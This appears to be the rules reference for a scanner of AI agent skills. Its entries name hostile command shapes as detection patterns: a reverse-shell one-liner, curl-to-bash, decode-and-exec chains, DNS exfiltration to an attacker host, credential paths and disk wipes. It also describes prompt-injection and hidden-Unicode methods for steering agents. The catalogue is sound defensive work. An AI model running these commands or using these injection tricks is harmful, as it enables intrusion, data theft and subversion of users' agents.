# Sigil scan rules

Every rule `sigil scan` applies, grouped by family. Each entry gives what it catches, why it matters, its
OWASP [Agentic Skills Top 10](https://owasp.org/www-project-agentic-skills-top-10/) mapping, known false
positives, and whether it can be suppressed. Rule ids (`SIG-SEC-NNN`) are stable and never reused.

## Suppression

Add `sigil-scan-ignore SIG-SEC-NNN: <reason>` in a comment on the line before a finding (or at the
end of its line). Markdown `<!-- -->`, `#` and `//` comments all work. **A reason is required.** A
suppressed finding is kept as `info` with the reason, never dropped, and a suppression without a reason
is itself reported (SIG-SEC-900). Rules marked *not suppressible* hide text from reviewers and can never
be waived.

## Context model

The same pattern is weighted by where it sits: a **script** line or an **instruction** to the agent is
riskier than a **fenced example** inside a security section or a **reference** read on demand. Severities
below are the worst case (script/instruction); examples and references are downgraded automatically.

## OWASP AST01-AST10

- **AST01** Malicious Skills
- **AST02** Supply Chain Compromise
- **AST03** Over-Privileged Skills
- **AST04** Insecure Metadata
- **AST05** Untrusted External Instructions
- **AST06** Weak Isolation
- **AST07** Update Drift
- **AST08** Poor Scanning
- **AST09** No Governance
- **AST10** Cross-Platform Reuse

## Remote code fetch and execute

### SIG-SEC-001 — Remote download piped into an interpreter

- **Catches / why:** The fetched script can change at any time, and differs per caller if the server wants it to. ClawHavoc delivered the AMOS stealer this way. Vendor the script into the capability (so it is sealed by the digest) or pin it by hash and run it from a file.
- **OWASP:** AST01
- **Severity (worst case):** critical
- **Known false positives:** Official installers (`curl -fsSL https://bun.sh/install | bash`) are still flagged: the content is not sealed. Suppress with a reason if you accept the vendor risk.
- **Suppress:** `sigil-scan-ignore SIG-SEC-001: <reason>`

### SIG-SEC-002 — PowerShell or Windows LOLBin download-and-execute

- **Catches / why:** `iex (iwr …)`, `-EncodedCommand`, `certutil -urlcache`, `bitsadmin /transfer`, `mshta http…` and `regsvr32 /i:http…` are the Windows equivalents of `curl | sh` and the standard first stage of commodity malware. Ship the script inside the capability instead.
- **OWASP:** AST01
- **Severity (worst case):** critical
- **Known false positives:** Rare outside installers. Chocolatey and Scoop install one-liners use `iex (irm …)` and are flagged on purpose.
- **Suppress:** `sigil-scan-ignore SIG-SEC-002: <reason>`

### SIG-SEC-003 — Downloads a file and makes it executable or runs it

- **Catches / why:** Downloading a binary or script, then `chmod +x` / `./file` / opening a `.dmg` or `.pkg`, runs code that is not part of the reviewed capability. ClawHavoc told users to download an "openclaw-core" prerequisite and run it. Bundle what you need, or document a package-manager install with a pinned version.
- **OWASP:** AST01
- **Severity (worst case):** high
- **Known false positives:** Tool installers that fetch a pinned release binary are flagged too; prefer a package manager or verify a checksum in the same step and suppress with a reason.
- **Suppress:** `sigil-scan-ignore SIG-SEC-003: <reason>`

### SIG-SEC-004 — Package installed from a URL, git ref or custom index

- **Catches / why:** Installing from `git+https://…`, a tarball URL or `github:user/repo` runs whatever that ref points at today; install scripts run with your privileges. A custom `--index-url` / `--registry` enables dependency confusion. Publish to the registry and pin an exact version, or pin a full commit SHA.
- **OWASP:** AST02
- **Severity (worst case):** high
- **Known false positives:** Vendor package indexes such as `download.pytorch.org` are reported at medium. Git sources pinned to a 40-character commit are not reported.
- **Suppress:** `sigil-scan-ignore SIG-SEC-004: <reason>`

### SIG-SEC-004 — Package installed from a URL, git ref or custom index

- **Catches / why:** Installing from `git+https://…`, a tarball URL or `github:user/repo` runs whatever that ref points at today; install scripts run with your privileges. A custom `--index-url` / `--registry` enables dependency confusion. Publish to the registry and pin an exact version, or pin a full commit SHA.
- **OWASP:** AST02
- **Severity (worst case):** high
- **Known false positives:** Vendor package indexes such as `download.pytorch.org` are reported at medium. Git sources pinned to a 40-character commit are not reported.
- **Suppress:** `sigil-scan-ignore SIG-SEC-004: <reason>`

### SIG-SEC-005 — Instructions loaded from a remote URL or paste site

- **Catches / why:** Text fetched at run time becomes part of the instructions but sits outside the digest, so it can change after review (OWASP AST05; Air Security's "Story of Skills"). Paste sites (rentry.co, glot.io, pastebin) were ClawHavoc's second stage. Put the instructions in the capability, or pin the content by hash.
- **OWASP:** AST05
- **Severity (worst case):** high
- **Known false positives:** Links to documentation the agent reads for reference are not flagged unless the text says to follow or execute what is there.
- **Suppress:** `sigil-scan-ignore SIG-SEC-005: <reason>`

### SIG-SEC-006 — Password-protected archive to extract and run

- **Catches / why:** ClawHavoc and Snyk's ToxicSkills samples shipped Windows payloads as password-protected ZIPs on GitHub releases ("extract using pass: openclaw"). A legitimate tool has no reason to hide its contents from scanners.
- **OWASP:** AST01
- **Severity (worst case):** high
- **Known false positives:** Encrypted backups handled by the user. Rare in skills.
- **Suppress:** `sigil-scan-ignore SIG-SEC-006: <reason>`

### SIG-SEC-007 — Package runner executes an unpinned package

- **Catches / why:** `npx pkg`, `npx pkg@latest` and `uvx pkg` download and execute the newest release on every run, so a compromised maintainer account or a typosquat reaches every user without any change to the capability (OWASP AST07, update drift). Pin an exact version: `npx pkg@1.4.2`, `uvx pkg@1.4.2`.
- **OWASP:** AST07
- **Severity (worst case):** low
- **Known false positives:** Well-known CLIs run through npx are still reported at low; pinning costs nothing.
- **Suppress:** `sigil-scan-ignore SIG-SEC-007: <reason>`

### SIG-SEC-008 — Commands that run automatically when the skill loads

- **Catches / why:** Claude Code runs `!`command`` in skills and commands before the model sees the text, and skill frontmatter `hooks:` run on agent events while the skill is active. Neither the user nor the agent decides to run them. Keep them read-only and obvious (`git status`), and never hide them in comments.
- **OWASP:** AST02
- **Severity (worst case):** medium
- **Known false positives:** Read-only context commands such as `!`git diff`` are reported at low as an inventory item.
- **Suppress:** `sigil-scan-ignore SIG-SEC-008: <reason>`

### SIG-SEC-009 — Redirects a package manager to a non-default registry

- **Catches / why:** Writing an `.npmrc`/`.yarnrc`/`pip.conf` or running `npm config set registry` to point at a non-default registry silently routes every future dependency install through a host the author controls (Trail of Bits' `dev-env-setup`; dependency confusion, OWASP AST02). Install from the public registry, or have the user configure a mirror themselves.
- **OWASP:** AST02
- **Severity (worst case):** high
- **Known false positives:** A corporate-mirror setup skill does this on purpose; declare the host in sigil.yaml and suppress with a reason. A registry line pointing at the default public registry is not flagged.
- **Suppress:** `sigil-scan-ignore SIG-SEC-009: <reason>`

## Obfuscation

### SIG-SEC-010 — Decodes data and executes the result

- **Catches / why:** `echo … | base64 -d | bash`, `eval "$(… | xxd -r -p)"`, `exec(b64decode(…))`, `eval(atob(…))` and `pickle.loads(…)` on decoded or remote data exist to hide what runs. This is the ClawHavoc dropper shape, and Tencent Zhuque Lab's remote-pickle sample. Nothing legitimate in a skill needs it: ship the plain command.
- **OWASP:** AST01
- **Severity (worst case):** critical
- **Known false positives:** Security training material that shows the pattern inside a section about attacks is downgraded to medium; prefer describing it without a working decoder chain.
- **Suppress:** `sigil-scan-ignore SIG-SEC-010: <reason>`

### SIG-SEC-011 — Encoded blob that decodes to commands or URLs

- **Catches / why:** Base64, hex, `\x` escapes and character-code arrays are decoded and the result is scanned with every rule. A blob that hides a command, a URL or another rule's pattern is a payload waiting for a decoder, and the LLM itself can be the decoder (OWASP AST08). Put the plain text in the file.
- **OWASP:** AST08
- **Severity (worst case):** high
- **Known false positives:** Images, hashes, keys and JWT examples decode to binary or harmless JSON and are ignored. Encoded URLs in test data are reported at medium.
- **Suppress:** `sigil-scan-ignore SIG-SEC-011: <reason>`

### SIG-SEC-012 — Command or API name assembled to dodge pattern matching

- **Catches / why:** `c''url`, `c\url`, IFS word-splitting, `$'\x63url'`, `"ev" + "al"` and `getattr(os, "sys" + "tem")` produce a dangerous name only at run time. SkillCloak showed these rewrites defeat most marketplace scanners. Sigil undoes them before matching and reports the trick itself.
- **OWASP:** AST08
- **Severity (worst case):** high
- **Known false positives:** Minified bundles can concatenate short strings; those are reported by SIG-SEC-083 as packed code.
- **Suppress:** `sigil-scan-ignore SIG-SEC-012: <reason>`

## Invisible and deceptive Unicode

### SIG-SEC-020 — Hidden text in Unicode tag characters (ASCII smuggling)

- **Catches / why:** Characters U+E0000–U+E007F mirror ASCII but render as nothing, so a line can carry instructions only the model reads. Snyk's ToxicSkills samples hid a "Prerequisites" payload this way. Sigil decodes and shows the hidden text. This rule cannot be suppressed.
- **OWASP:** AST04
- **Severity (worst case):** critical
- **Known false positives:** Emoji subdivision flags (England, Scotland, Wales) use tag characters after U+1F3F4 and are ignored.
- **Suppress:** not suppressible

### SIG-SEC-021 — Bidirectional control characters that reorder text (Trojan Source)

- **Catches / why:** Right-to-left overrides and isolates make text display in a different order from how it is read by a parser or a model (CVE-2021-42574, "Trojan Source"). A reviewer sees one command; the agent gets another.
- **OWASP:** AST04
- **Severity (worst case):** high
- **Known false positives:** Isolates in genuine right-to-left prose (Hebrew, Arabic) are reported at low. Overrides are always high.
- **Suppress:** `sigil-scan-ignore SIG-SEC-021: <reason>`

### SIG-SEC-022 — Zero-width or invisible characters

- **Catches / why:** Zero-width spaces, joiners and fillers are invisible. Inside a word they break pattern matching (`cu​rl`); in runs they encode hidden data bit by bit. Sigil removes them before matching other rules and reports where they are.
- **OWASP:** AST04
- **Severity (worst case):** high
- **Known false positives:** Joiners inside emoji sequences and in scripts that need them (Arabic, Persian, Indic) are ignored. A stray zero-width space pasted into prose is reported at low.
- **Suppress:** `sigil-scan-ignore SIG-SEC-022: <reason>`

### SIG-SEC-023 — Data hidden in Unicode variation selectors

- **Catches / why:** The 256 variation selectors can encode one byte each after any visible character, so an emoji can carry a whole hidden message. Sigil decodes the bytes and shows them. This rule cannot be suppressed.
- **OWASP:** AST04
- **Severity (worst case):** critical
- **Known false positives:** A single U+FE0F or U+FE0E after an emoji or symbol is normal and ignored; so is a single ideographic variation selector after a CJK character.
- **Suppress:** not suppressible

### SIG-SEC-024 — Lookalike letters from another script in a command, name or host

- **Catches / why:** Cyrillic `с` and Latin `c` look identical. Mixing scripts inside one word makes a command, package or domain look like another (`сurl`, `gіthub.com`), and slips past exact-match rules. SkillCloak used lookalike substitution against marketplace scanners. Sigil folds lookalikes before matching and reports them.
- **OWASP:** AST04
- **Severity (worst case):** high
- **Known false positives:** Prose in Greek, Cyrillic or Armenian is not mixed-script and is ignored; Greek letters in maths ("α-helix") are only reported in code.
- **Suppress:** `sigil-scan-ignore SIG-SEC-024: <reason>`

### SIG-SEC-025 — Terminal escape sequences or control characters in text

- **Catches / why:** Raw ESC sequences and carriage returns rewrite what a terminal shows: `cat SKILL.md` or a diff can display a harmless line while the file holds another. Text files have no reason to contain them.
- **OWASP:** AST04
- **Severity (worst case):** high
- **Known false positives:** Windows line endings (CR before LF) are ignored. Literal escape notation such as `\033[31m` in scripts is text, not a control character, and is not reported.
- **Suppress:** `sigil-scan-ignore SIG-SEC-025: <reason>`

## Prompt injection and concealment

### SIG-SEC-030 — Prompt injection: revokes the agent's standing instructions

- **Catches / why:** A capability adds instructions; it never revokes the operator's. A revoke verb aimed at the "previous/system/safety instructions", or a fake `<|im_start|>` / `[INST]` / `<system>` role marker, is injection (OWASP AST01; Snyk found injection beside the code in most confirmed malicious skills). Deep semantic coverage is the lab's behavioural layer, not this static rule.
- **OWASP:** AST01
- **Severity (worst case):** high
- **Known false positives:** Security docs that quote these as examples to detect are downgraded by the mention check ("such as", "detect", quotes) and by sitting in a security section.
- **Suppress:** `sigil-scan-ignore SIG-SEC-030: <reason>`

### SIG-SEC-031 — Instruction that edits the agent's own config, memory or approvals

- **Catches / why:** Injecting into `SOUL.md`/`MEMORY.md`, `.claude/settings.json`, `allowed-tools` or auto-approve plants a backdoor that survives the skill (OWASP AST01, SOUL.md persistence). Editing a project's `CLAUDE.md`/`AGENTS.md` is reported more gently, as it is often legitimate.
- **OWASP:** AST01
- **Severity (worst case):** high
- **Known false positives:** A config- or prompt-auditing skill that edits CLAUDE.md/AGENTS.md on purpose matches at medium; declare the intent and suppress with a reason.
- **Suppress:** `sigil-scan-ignore SIG-SEC-031: <reason>`

### SIG-SEC-032 — Action paired with keeping the user uninformed

- **Catches / why:** A legitimate capability has no reason to hide a step from the person running it. "Without telling the user" near an action verb, or a covert adverb driving an action ("silently upload"), is the concealment signal prompt-injection scanners flag (OWASP AST08). Deliberately narrow; the behavioural layer catches the rest.
- **OWASP:** AST08
- **Severity (worst case):** high
- **Known false positives:** Prose like "silently overwrites" or "silently falls back" describing an unwanted side effect does not match: the adverb must directly drive a transmit/run/delete verb, or the user must be the explicit object of "do not tell".
- **Suppress:** `sigil-scan-ignore SIG-SEC-032: <reason>`

### SIG-SEC-033 — Large blank padding that pushes content out of view

- **Catches / why:** Trail of Bits hid a payload behind 100,000 newlines so scanners truncated the file and the web UI scrolled past it. A long run of blank or whitespace-only lines, or a wall of trailing spaces, exists to move content past where a reviewer or a size-capped scanner looks. Sigil scans the whole file regardless.
- **OWASP:** AST08
- **Severity (worst case):** medium
- **Known false positives:** Generated or concatenated files can have large blank gaps; reported at low below 2,000 lines of padding.
- **Suppress:** `sigil-scan-ignore SIG-SEC-033: <reason>`

## Credential and sensitive-path access

### SIG-SEC-040 — Reads credentials or other secrets outside the project

- **Catches / why:** SSH and cloud keys (`~/.ssh/id_*`, `~/.aws/credentials`), CLI tokens (`~/.config/gh`, `~/.npmrc`), OS keychains (`security find-generic-password`, `secret-tool`), browser login stores and crypto wallets are outside any skill's job. Snyk found 280+ skills reading credentials beyond their function; ClawHavoc read `~/.clawdbot/.env`. Declare only the project files you need.
- **OWASP:** AST03
- **Severity (worst case):** high
- **Known false positives:** A credentials-management skill will legitimately touch these paths; document it in sigil.yaml and suppress with a reason. Mentions inside a security/"never read" section are downgraded.
- **Suppress:** `sigil-scan-ignore SIG-SEC-040: <reason>`

### SIG-SEC-041 — Queries the cloud instance metadata service

- **Catches / why:** The link-local address 169.254.169.254 (and the GCP/Azure equivalents) returns IAM role credentials to anything that can reach it. A skill querying it is harvesting cloud credentials. No capability needs this; the runtime provides credentials through declared env vars.
- **OWASP:** AST03
- **Severity (worst case):** high
- **Known false positives:** Documentation about SSRF that names the address is downgraded in a security section or when the mention check fires.
- **Suppress:** `sigil-scan-ignore SIG-SEC-041: <reason>`

### SIG-SEC-042 — Captures the whole environment block

- **Catches / why:** Grabbing all of `env` / `os.environ` / `process.env` and sending or writing it leaks every secret the agent holds. Trail of Bits' `.pyc` sample dumped `os.environ`. Read the specific variables you declared in sigil.yaml instead of the whole block.
- **OWASP:** AST03
- **Severity (worst case):** medium
- **Known false positives:** Reading one named variable (`os.environ["FOO"]`, `process.env.FOO`) does not match. A bare `printenv` for debugging is medium; piping it to the network is caught by SIG-SEC-050.
- **Suppress:** `sigil-scan-ignore SIG-SEC-042: <reason>`

## Exfiltration

### SIG-SEC-050 — Sends captured data or a file to the network

- **Catches / why:** A sender (`curl`, `requests.post`, `/dev/tcp`, `sendBeacon`) carrying command output, a file or env (`--data "$(cat …)"`, `-T file`, `@~/…`) is exfiltration. The destination raises severity: a raw IP, a paste site, a webhook catcher or a chat-bot API is almost always malicious.
- **OWASP:** AST01
- **Severity (worst case):** high
- **Known false positives:** Posting to a declared, legitimate API host is downgraded. The destination allowlist is the manifest's `network`; conformance (SIG-SEC-090) reports undeclared hosts separately.
- **Suppress:** `sigil-scan-ignore SIG-SEC-050: <reason>`

### SIG-SEC-051 — Posts to a Discord, Telegram or Slack bot endpoint

- **Catches / why:** Discord/Slack incoming webhooks and the Telegram Bot API are the usual out-of-band channel for stolen data (Unit 42 saw Polymarket skills exfiltrate wallet keys over Telegram). Legitimate notification use exists, so this is medium in prose and high in a script; declare the host and suppress with a reason if intended.
- **OWASP:** AST01
- **Severity (worst case):** medium
- **Known false positives:** A genuine notifier (CI posting build status to Slack) matches; declare the host in sigil.yaml and suppress.
- **Suppress:** `sigil-scan-ignore SIG-SEC-051: <reason>`

### SIG-SEC-052 — Encodes data into DNS lookups

- **Catches / why:** Putting command output or a secret into a hostname and resolving it (`dig $(whoami).attacker…`) exfiltrates over DNS, which egress proxies rarely inspect. Interactsh/oast.* hosts are the usual sink. No capability needs dynamic DNS of captured data.
- **OWASP:** AST01
- **Severity (worst case):** high
- **Known false positives:** Ordinary `dig example.com` or a variable hostname from config does not match; the rule needs captured data in the query.
- **Suppress:** `sigil-scan-ignore SIG-SEC-052: <reason>`

## Persistence and config tampering

### SIG-SEC-060 — Installs a scheduled job or system service

- **Catches / why:** crontab, launchd (`LaunchAgents`/`LaunchDaemons`), systemd units, `schtasks /create` and `at` give code execution that outlives the session. Unit 42 saw auto-updater skills register cron jobs so their C2 survived removal. A skill should not schedule background execution.
- **OWASP:** AST06
- **Severity (worst case):** high
- **Known false positives:** A skill whose job is to set up scheduled deployments is legitimate; declare it and suppress with a reason.
- **Suppress:** `sigil-scan-ignore SIG-SEC-060: <reason>`

### SIG-SEC-061 — Writes to a shell startup file

- **Catches / why:** Appending to `~/.bashrc`, `~/.zshrc`, `~/.profile`, `/etc/profile.d` or the PowerShell `$PROFILE` means the author's code runs on every new shell, long after the task. Keep changes inside the project.
- **OWASP:** AST06
- **Severity (worst case):** high
- **Known false positives:** A dev-environment skill may legitimately edit rc files; reading them for PATH detection does not match (only writes do). Suppress with a reason where intended.
- **Suppress:** `sigil-scan-ignore SIG-SEC-061: <reason>`

### SIG-SEC-062 — Writes a git hook or redirects hooksPath

- **Catches / why:** A script dropped in `.git/hooks/` or a redirected `core.hooksPath` runs on commit, push or checkout with the developer's privileges, independent of the agent. A skill editing tracked project files has no reason to write there.
- **OWASP:** AST06
- **Severity (worst case):** high
- **Known false positives:** Tools that manage hooks (husky, pre-commit, lefthook) write hook files; they are declared project tooling and suppressible.
- **Suppress:** `sigil-scan-ignore SIG-SEC-062: <reason>`

### SIG-SEC-063 — Disables the agent sandbox or approval prompts

- **Catches / why:** `--dangerously-skip-permissions`, `--yolo`, `--sandbox none`, `approval_policy: never` and `DISABLE_SANDBOX` turn off the containment and the human-in-the-loop that make everything else safe (OWASP AST06). A capability that removes approvals is removing the only control the user has.
- **OWASP:** AST06
- **Severity (worst case):** high
- **Known false positives:** A capability's own test harness may run the agent with skipped permissions in CI; that belongs in test scripts, not in installed payload, and is suppressible with a reason.
- **Suppress:** `sigil-scan-ignore SIG-SEC-063: <reason>`

## Destructive operations

### SIG-SEC-070 — Recursive force-delete of a root, home or device, or a disk wipe

- **Catches / why:** `rm -rf /`, `rm -rf ~`, `rm -rf $VAR/` with an unset variable, `dd of=/dev/sda`, `mkfs`, `diskutil eraseDisk` and `Remove-Item -Recurse -Force C:\` cause irreversible data loss. A skill that deletes build output targets a specific relative path, never the root or home.
- **OWASP:** AST03
- **Severity (worst case):** high
- **Known false positives:** `rm -rf ./dist`, `rm -rf "$TEST_ROOT"` and `rm -rf node_modules` target a bounded path and are not flagged. The rule requires a root/home/device/glob target.
- **Suppress:** `sigil-scan-ignore SIG-SEC-070: <reason>`

### SIG-SEC-071 — Makes files world-writable or world-readable

- **Catches / why:** `chmod 777`, `chmod -R a+rwx ~` and `icacls … /grant Everyone:F` let any local user read or alter the files, and widen the blast radius of any other compromise. Set the narrowest mode that works.
- **OWASP:** AST03
- **Severity (worst case):** medium
- **Known false positives:** `chmod +x script.sh` on a specific file is not matched (only `+x` on root/home is). Container build scripts sometimes use 777 for a scratch dir; suppress with a reason.
- **Suppress:** `sigil-scan-ignore SIG-SEC-071: <reason>`

### SIG-SEC-072 — Force-push or history-destroying git command

- **Catches / why:** `git push --force` (without `--with-lease`), `git reset --hard origin/main`, `git clean -fd`, `git branch -D` and `reflog expire --expire=now` overwrite or drop commits that are hard or impossible to recover. Prefer `--force-with-lease` and let the user decide.
- **OWASP:** AST03
- **Severity (worst case):** medium
- **Known false positives:** A release skill may force-push a tag or a generated branch; that is legitimate and suppressible. `--force-with-lease` is not matched.
- **Suppress:** `sigil-scan-ignore SIG-SEC-072: <reason>`

### SIG-SEC-073 — Disables a firewall, EDR or OS protection

- **Catches / why:** Stopping the firewall, AppArmor, auditd or an EDR agent, `setenforce 0`, `csrutil disable`, `spctl --master-disable` or adding a Defender exclusion clears the way for other malware. Snyk's ToxicSkills taxonomy calls this "security disablement". A coding skill never needs it.
- **OWASP:** AST06
- **Severity (worst case):** high
- **Known false positives:** Rare in skills. A container-provisioning template may stop a service during setup; suppress with a reason.
- **Suppress:** `sigil-scan-ignore SIG-SEC-073: <reason>`

### SIG-SEC-074 — Opens a reverse or bind shell

- **Catches / why:** `bash -i >& /dev/tcp/host/port 0>&1`, `nc -e /bin/sh`, `socat … EXEC:sh`, a Python `socket`+`pty.spawn`, or a PowerShell `TCPClient` stream hands a remote attacker a shell. Koi found reverse-shell backdoors embedded in otherwise-working ClawHavoc skills. Never legitimate in a capability.
- **OWASP:** AST01
- **Severity (worst case):** critical
- **Known false positives:** A networking tutorial that shows the one-liner in a fenced example is downgraded; prose about reverse shells does not match without the command shape.
- **Suppress:** `sigil-scan-ignore SIG-SEC-074: <reason>`

## Risky bundled files

### SIG-SEC-080 — Executable, bytecode or disguised binary in the payload

- **Catches / why:** Compiled executables (ELF, Mach-O, PE, Wasm) and bytecode (`.pyc`, `.class`) cannot be reviewed as source and are not scanned for behaviour; Trail of Bits hid a payload in a `.pyc` whose source looked clean. A disguised type (a ZIP named `.txt`) is worse. Ship source, and let the lab build artefacts.
- **OWASP:** AST08
- **Severity (worst case):** high
- **Known false positives:** A `tool` capability legitimately ships a binary; declare it and suppress with a reason, or publish the source and a reproducible build.
- **Suppress:** `sigil-scan-ignore SIG-SEC-080: <reason>`

### SIG-SEC-081 — Archive in the payload, especially encrypted or holding code

- **Catches / why:** Archives let code ride along unscanned: a `.docx` is a ZIP, and Trail of Bits' `context-loader` carried a shell script inside one. Sigil opens archives and scans text members; an encrypted member cannot be opened and is treated as high (the password exists to stop scanners).
- **OWASP:** AST08
- **Severity (worst case):** medium
- **Known false positives:** Test fixtures and sample documents are legitimate; a media archive with no code member is reported at low.
- **Suppress:** `sigil-scan-ignore SIG-SEC-081: <reason>`

### SIG-SEC-082 — Minified or packed script

- **Catches / why:** Minified or obfuscated JavaScript (one enormous line, `eval(function(p,a,c,k,e,d)…)`, `_0x`-mangled names, long `\x` runs) cannot be reviewed and is a standard way to hide behaviour. Ship readable source and let the build minify.
- **OWASP:** AST08
- **Severity (worst case):** medium
- **Known false positives:** A legitimately minified vendored library matches; move it out of the payload or suppress with a reason. Reported only for script/data files.
- **Suppress:** `sigil-scan-ignore SIG-SEC-082: <reason>`

### SIG-SEC-083 — package.json lifecycle install script

- **Catches / why:** npm runs `preinstall`/`install`/`postinstall`/`prepare` automatically on `npm install`, before any code is reviewed; this is the classic npm supply-chain foothold (and CVE-2025-59536-style repo-open RCE). A capability should not need install-time execution. Its contents are also scanned as scripts.
- **OWASP:** AST02
- **Severity (worst case):** medium
- **Known false positives:** A build `prepare` that compiles TypeScript is common; it still runs automatically, so it is reported at low when it only calls a local build.
- **Suppress:** `sigil-scan-ignore SIG-SEC-083: <reason>`

### SIG-SEC-084 — Symbolic link in the payload

- **Catches / why:** A symlink can point outside the capability and change what is read or installed after review; one that escapes the directory can leak or clobber a file beyond it. The digest refuses symlinks for catalog capabilities; scan reports them everywhere. Ship real files.
- **OWASP:** AST08
- **Severity (worst case):** medium
- **Known false positives:** A symlink staying inside the payload (into a shared references dir) is reported at low. Any link escaping the unit is medium.
- **Suppress:** `sigil-scan-ignore SIG-SEC-084: <reason>`

### SIG-SEC-085 — File could not be scanned

- **Catches / why:** A file the scanner cannot read as text or open as a known container is a blind spot: Trail of Bits' bypasses all lived in formats scanners skipped. It is reported so a reviewer looks by hand. Convert it to a reviewable form or justify it.
- **OWASP:** AST08
- **Severity (worst case):** low
- **Known false positives:** Legitimate media and data assets are reported here at low; large media is expected in some capabilities.
- **Suppress:** `sigil-scan-ignore SIG-SEC-085: <reason>`

## Manifest conformance and policy

### SIG-SEC-090 — Contacts a host not declared in permissions.network

- **Catches / why:** A capability's scripts and instructions may only reach hosts its manifest declares. An undeclared host is either an honest omission or an understatement hiding exfiltration (the AST04 "network: false while curl runs" case). Add the host to `permissions.network`, or remove the call.
- **OWASP:** AST03
- **Severity (worst case):** medium
- **Known false positives:** Documentation links (vendor docs, GitHub repos the text references) count as used hosts; add them or move them to a declared docs host. Placeholder hosts (example.com, localhost) are ignored.
- **Suppress:** `sigil-scan-ignore SIG-SEC-090: <reason>`

### SIG-SEC-091 — Runs a command not declared in permissions.shell

- **Catches / why:** The commands a capability runs, or tells the agent to run, should match `permissions.shell`. A command outside that list is undeclared authority. This is a hygiene and transparency check; the dangerous-command rules fire independently.
- **OWASP:** AST03
- **Severity (worst case):** low
- **Known false positives:** Example commands in documentation are counted; keep them in fenced examples (reported at low) or declare the prefix. Shell builtins (cd, echo, test) are ignored.
- **Suppress:** `sigil-scan-ignore SIG-SEC-091: <reason>`

### SIG-SEC-092 — Reads an environment variable not declared in permissions.env

- **Catches / why:** Environment variables a capability reads should be declared in `permissions.env` so the user knows what it consumes. Undeclared reads of credential-shaped names (`*_TOKEN`, `*_KEY`, `*_SECRET`) are raised, since that is how a skill quietly harvests secrets.
- **OWASP:** AST03
- **Severity (worst case):** low
- **Known false positives:** Common runtime variables (PATH, HOME, PWD, CI, language-specific ones) are ignored. A variable the capability sets itself is not a read.
- **Suppress:** `sigil-scan-ignore SIG-SEC-092: <reason>`

### SIG-SEC-093 — Writes files while permissions.filesystem forbids it

- **Catches / why:** When `permissions.filesystem` is `none` or `read`, the capability must not write. A write under a read-only declaration is an understated permission. Set `filesystem: write` if writing is intended, or remove the write.
- **OWASP:** AST03
- **Severity (worst case):** medium
- **Known false positives:** Writing to a temp dir for scratch work still counts; declare `write`. Output redirection in a fenced example is reported at low.
- **Suppress:** `sigil-scan-ignore SIG-SEC-093: <reason>`

### SIG-SEC-094 — Declares a permission it never uses

- **Catches / why:** A declared host or command that the payload never uses is over-permission: least privilege means declaring only what is needed (OWASP AST03). This is informational; trim the manifest.
- **OWASP:** AST03
- **Severity (worst case):** info
- **Known false positives:** A capability whose commands are constructed dynamically, or whose network use is in content this scanner cannot see, may trip this. Informational only.
- **Suppress:** `sigil-scan-ignore SIG-SEC-094: <reason>`

### SIG-SEC-100 — Policy grants all or dangerous tools

- **Catches / why:** An allowlist containing `*`, `Bash`, `Bash(*)` or `Bash(sudo:*)` lets the agent run anything without asking, which is the whole point of the approval system (OWASP AST03/AST06). A policy should enumerate the exact tools and command prefixes it needs.
- **OWASP:** AST03
- **Severity (worst case):** high
- **Known false positives:** A deny-list using `*` as a base before narrowing is legitimate; this rule only flags `*`-style entries under allow/permission fields, not under deny.
- **Suppress:** `sigil-scan-ignore SIG-SEC-100: <reason>`

### SIG-SEC-101 — Policy turns off the sandbox or approvals

- **Catches / why:** A settings fragment setting `sandbox: none`, `approval_policy: never`, `permissionMode: bypassPermissions` or `requireApproval: false` removes the containment and human-in-the-loop the user relies on (OWASP AST06). A capability should never ship a policy that disables these.
- **OWASP:** AST06
- **Severity (worst case):** high
- **Known false positives:** A capability that documents how to raise the sandbox (turning things on) is not matched; only disabling values are. Suppress with a reason for a policy whose purpose is to relax a specific setting.
- **Suppress:** `sigil-scan-ignore SIG-SEC-101: <reason>`

### SIG-SEC-102 — MCP configuration trusts all servers or tools

- **Catches / why:** Auto-approving every MCP tool (`alwaysAllow: ["*"]`, `trust: all`, `autoApprove: true`) lets any connected server run any tool without a prompt. Trust specific tools, not a wildcard.
- **OWASP:** AST06
- **Severity (worst case):** medium
- **Known false positives:** A single-server dev setup that trusts its one named tool is fine; the rule targets `*` and all-servers switches.
- **Suppress:** `sigil-scan-ignore SIG-SEC-102: <reason>`

## Scanner bookkeeping

### SIG-SEC-900 — sigil-scan-ignore without rule ids and a reason

- **Catches / why:** A suppression must name the rule ids it waives and give a reason: `sigil-scan-ignore SIG-SEC-001: vendored installer, reviewed`. An ignore comment without both is itself reported, so suppressions cannot silently swallow findings.
- **OWASP:** —
- **Severity (worst case):** low
- **Known false positives:** None: the comment is either well-formed or it is reported.
- **Suppress:** not suppressible

## Known gaps

Static scanning cannot see everything. Prompt-injection coverage (SIG-SEC-030..033) is deliberately
structural — hidden channels, edits to the agent's own config, memory or approvals, and a covert action
paired with keeping the user uninformed — not a corpus of attack phrases, which attackers trivially
reword (Tencent Zhuque Lab; SkillCloak). Natural-language intent in novel wording, logic that only fires
on a specific date or host, and anything reconstructed at runtime are out of scope here: they are the job
of the lab's behavioural canary sandbox and human review. **Planned: a semantic review layer** that reads
intent, as recommended by Snyk and Trail of Bits, who both showed pattern-only scanners are bypassable.
